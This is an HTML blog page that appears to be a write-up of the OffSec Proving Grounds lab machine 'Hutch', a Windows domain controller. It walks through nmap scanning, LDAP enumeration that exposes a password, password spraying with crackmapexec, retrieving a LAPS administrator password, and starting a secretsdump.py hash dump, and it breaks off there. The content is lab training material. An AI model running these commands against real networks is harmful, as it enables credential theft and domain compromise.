@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Offsec PG Hutch (Writeup) | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Offsec PG Hutch (Writeup) | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Offsec PG Hutch (Writeup) | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Offsec PG Hutch (Writeup) | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Offsec PG Hutch (Writeup) | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for PG Hutch">
+<meta itemprop="description" content="Writeup for PG Hutch" />
+<meta property="og:description" content="Writeup for PG Hutch" />
+<meta name="twitter:description" content="Writeup for PG Hutch" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-09-25T00:00:00Z />
+    <meta property="article:published_time" content=2023-09-25T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Offsec PG Hutch (Writeup)",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-09-25",
+        "description": "Writeup for PG Hutch",
+        "wordCount":  1019 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-09-25",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/hutch/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Offsec PG Hutch (Writeup)</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-09-25T00:00:00&#43;00:00" itemprop="datePublished"> 25 Sep 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hutch">Hutch</a></li>
+    <li><a href="#enumeration-with-nmap">Enumeration with Nmap</a></li>
+    <li><a href="#enumerating-ldap">Enumerating LDAP</a></li>
+    <li><a href="#enumerating-users">Enumerating Users</a></li>
+    <li><a href="#finding-users-with-better-privilege">Finding users with better privilege</a></li>
+    <li><a href="#getting-the-shell">Getting the shell</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="hutch">Hutch</h1>
+<h1 id="enumeration-with-nmap">Enumeration with Nmap</h1>
+<p><code>nmap -p- -sC -sV 192.168.175.122 -T4 -oN nmap.out</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/hatch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -p- -sC -sV 192.168.175.122 -T4 -oN nmap.out
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-09-25 23:53 EEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.175.122
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.046s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65514</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-webdav-scan: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   WebDAV type: Unknown
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Server Date: Mon, <span class="m">25</span> Sep <span class="m">2023</span> 20:55:58 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Server Type: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2023-09-25 20:55:10Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hutch.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hutch.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49672/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49674/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49687/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49874/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: HUTCHDC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2023-09-25T20:55:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span></code></pre></div><p>Webdav is allowed in port 80
+LDAP is enabled
+Domain name is hutch.offsec</p>
+<h1 id="enumerating-ldap">Enumerating LDAP</h1>
+<p>Let’s search ldap with ldapsearch</p>
+<p><code>ldapsearch -x -b &quot;dc=hutch,dc=offsec&quot; -h 192.168.175.122 &gt; ldap.txt</code></p>
+<p><img src="Hutch%20aac63fefd54b41fd85acd5e7ed833711/Screenshot_2023-09-26_at_00.24.37.png" alt="Screenshot 2023-09-26 at 00.24.37.png"></p>
+<p>Command result contains a lot of information.
+I grepped the list of account by sAMAccountName</p>
+<p><code>grep -oP &quot;(?&lt;=sAMAccountName:).*&quot; ldap.txt</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl"> Domain Computers
+</span></span><span class="line"><span class="cl"> Cert Publishers
+</span></span><span class="line"><span class="cl"> Domain Users
+</span></span><span class="line"><span class="cl"> Domain Guests
+</span></span><span class="line"><span class="cl"> Group Policy Creator Owners
+</span></span><span class="line"><span class="cl"> RAS and IAS Servers
+</span></span><span class="line"><span class="cl"> Allowed RODC Password Replication Group
+</span></span><span class="line"><span class="cl"> Denied RODC Password Replication Group
+</span></span><span class="line"><span class="cl"> Enterprise Read-only Domain Controllers
+</span></span><span class="line"><span class="cl"> Cloneable Domain Controllers
+</span></span><span class="line"><span class="cl"> Protected Users
+</span></span><span class="line"><span class="cl"> DnsAdmins
+</span></span><span class="line"><span class="cl"> DnsUpdateProxy
+</span></span><span class="line"><span class="cl"> rplacidi
+</span></span><span class="line"><span class="cl"> opatry
+</span></span><span class="line"><span class="cl"> ltaunton
+</span></span><span class="line"><span class="cl"> acostello
+</span></span><span class="line"><span class="cl"> jsparwell
+</span></span><span class="line"><span class="cl"> oknee
+</span></span><span class="line"><span class="cl"> jmckendry
+</span></span><span class="line"><span class="cl"> avictoria
+</span></span><span class="line"><span class="cl"> jfrarey
+</span></span><span class="line"><span class="cl"> eaburrow
+</span></span><span class="line"><span class="cl"> cluddy
+</span></span><span class="line"><span class="cl"> agitthouse
+</span></span><span class="line"><span class="cl"> fmcsorley
+</span></span></code></pre></div><p>I found interesting information in the result. It can be used later for user enumeration.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">description: Password <span class="nb">set</span> to CrabSharkJellyfish192 at user<span class="err">&#39;</span>s request. Please c
+</span></span><span class="line"><span class="cl"> hange on next login.
+</span></span></code></pre></div><h1 id="enumerating-users">Enumerating Users</h1>
+<p>Based on the gathered information from ldapsearch, I searched users and corresponding password.</p>
+<p>Let’s find users and corresponding password with crackmapexec with smb option</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/hatch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# crackmapexec smb 192.168.175.122 -u ./users.txt -p ./pass.txt --continue-on-success
+</span></span><span class="line"><span class="cl">/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;class&#34;</span>: algorithms.Blowfish,
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:HUTCHDC<span class="o">)</span> <span class="o">(</span>domain:hutch.offsec<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\G</span>uest:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\D</span>omain Computers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\C</span>ert Publishers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\D</span>omain Users:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\D</span>omain Guests:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\G</span>roup Policy Creator Owners:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\R</span>AS and IAS Servers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\A</span>llowed RODC Password Replication Group:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\D</span>enied RODC Password Replication Group:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\E</span>nterprise Read-only Domain Controllers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\C</span>loneable Domain Controllers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\P</span>rotected Users:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\D</span>nsAdmins:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\D</span>nsUpdateProxy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\r</span>placidi:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\o</span>patry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\l</span>taunton:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\a</span>costello:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\j</span>sparwell:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\o</span>knee:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\j</span>mckendry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\a</span>victoria:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\j</span>frarey:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\e</span>aburrow:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\c</span>luddy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>-<span class="o">]</span> hutch.offsec<span class="se">\a</span>gitthouse:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">SMB         192.168.175.122 <span class="m">445</span>    HUTCHDC          <span class="o">[</span>+<span class="o">]</span> hutch.offsec<span class="se">\f</span>mcsorley:CrabSharkJellyfish192
+</span></span></code></pre></div><p>Now we got the valid username and password: <code>fmcsorley:CrabSharkJellyfish192</code></p>
+<p>With this user info, we can find user list with Impacket GetADUsers.py</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/hatch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# GetADUsers.py -all -dc-ip 192.168.175.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192 
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Querying 192.168.175.122 <span class="k">for</span> information about domain.
+</span></span><span class="line"><span class="cl">Name                  Email                           PasswordLastSet      LastLogon           
+</span></span><span class="line"><span class="cl">--------------------  ------------------------------  -------------------  -------------------
+</span></span><span class="line"><span class="cl">Administrator                                         2023-09-25 23:50:22.722364  2020-11-04 07:58:40.654236 
+</span></span><span class="line"><span class="cl">Guest                                                 &lt;never&gt;              &lt;never&gt;             
+</span></span><span class="line"><span class="cl">krbtgt                                                2020-11-04 07:26:23.099902  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">rplacidi                                              2020-11-04 07:35:05.106274  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">opatry                                                2020-11-04 07:35:05.216273  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">ltaunton                                              2020-11-04 07:35:05.264272  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">acostello                                             2020-11-04 07:35:05.315273  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">jsparwell                                             2020-11-04 07:35:05.377272  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">oknee                                                 2020-11-04 07:35:05.433274  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">jmckendry                                             2020-11-04 07:35:05.492273  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">avictoria                                             2020-11-04 07:35:05.545279  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">jfrarey                                               2020-11-04 07:35:05.603273  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">eaburrow                                              2020-11-04 07:35:05.652273  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">cluddy                                                2020-11-04 07:35:05.703274  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">agitthouse                                            2020-11-04 07:35:05.760273  &lt;never&gt;             
+</span></span><span class="line"><span class="cl">fmcsorley                                             2020-11-04 07:35:05.815275  2021-02-16 15:39:34.483491 
+</span></span><span class="line"><span class="cl">domainadmin                                           2021-02-16 07:24:22.190351  2023-09-25 23:47:29.894236
+</span></span></code></pre></div><p>I added Administrator and domainadmin to the users.txt</p>
+<h1 id="finding-users-with-better-privilege">Finding users with better privilege</h1>
+<p>crackmapexec ldap laps module let’s you find LAPS info</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/hatch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# crackmapexec ldap 192.168.175.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.175.122 -M laps
+</span></span><span class="line"><span class="cl">/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;class&#34;</span>: algorithms.Blowfish,
+</span></span><span class="line"><span class="cl">LDAP        192.168.175.122 <span class="m">389</span>    HUTCHDC          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:HUTCHDC<span class="o">)</span> <span class="o">(</span>domain:hutch.offsec<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        192.168.175.122 <span class="m">389</span>    HUTCHDC          <span class="o">[</span>+<span class="o">]</span> hutch.offsec<span class="se">\f</span>mcsorley:CrabSharkJellyfish192 
+</span></span><span class="line"><span class="cl">LAPS        192.168.175.122 <span class="m">389</span>    HUTCHDC          <span class="o">[</span>*<span class="o">]</span> Getting LAPS Passwords
+</span></span><span class="line"><span class="cl">LAPS        192.168.175.122 <span class="m">389</span>    HUTCHDC          Computer: HUTCHDC$             Password: yH<span class="o">{</span>w0s#-B.yV50
+</span></span></code></pre></div><p><code>Password: yH{w0s#-B.yV50</code> is added to the password list.</p>
+<p>Run the same command: <code>crackmapexec smb 192.168.175.122 -u ./users.txt -p ./pass.txt --continue-on-success</code></p>
+<p>and I got the new result</p>
+<p><code>SMB 192.168.175.122 445 HUTCHDC [+] hutch.offsec\Administrator:yH{w0s#-B.yV50 (Pwn3d!)</code></p>
+<p>Fortunately, this belongs to the Admin.</p>
+<p>Let’s get NTLM hash with Impacket script: secretdump.py</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/hatch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# secretsdump.py hutch.offsec/administrator:<span class="s1">&#39;yH{w0s#-B.yV50&#39;</span>@192.168.175.122
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
